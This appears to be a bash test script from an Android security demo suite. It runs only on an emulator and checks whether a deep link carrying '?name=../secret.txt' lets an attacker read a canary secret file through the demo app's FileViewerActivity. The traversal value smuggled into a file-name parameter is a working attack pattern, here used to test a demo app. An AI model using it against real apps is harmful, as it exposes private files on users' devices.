#!/usr/bin/env bash
# Threat 2 (SPEC section 2): path traversal through a deep link parameter. EMULATOR ONLY. adb alone.
cd "$(dirname "$0")" && . ./_common.sh
echo "== t2c: path traversal via ?name= (threat 2) =="
require_emulator; require_victim
reset_state
URI="https://shezguard.example/file?name=../secret.txt"
echo "ATTACK: open $URI (public/../secret.txt escapes the public folder)."
send "am start -a android.intent.action.VIEW -c android.intent.category.BROWSABLE -d '$URI' $VICTIM"
echo "LOOK FOR: 'ShezDemo ... file content: CANARY-SECRET-7f3a ...'."
verdict "ShezDemo.*CANARY-SECRET-7f3a" "$VICTIM/\.demo\.FileViewerActivity"
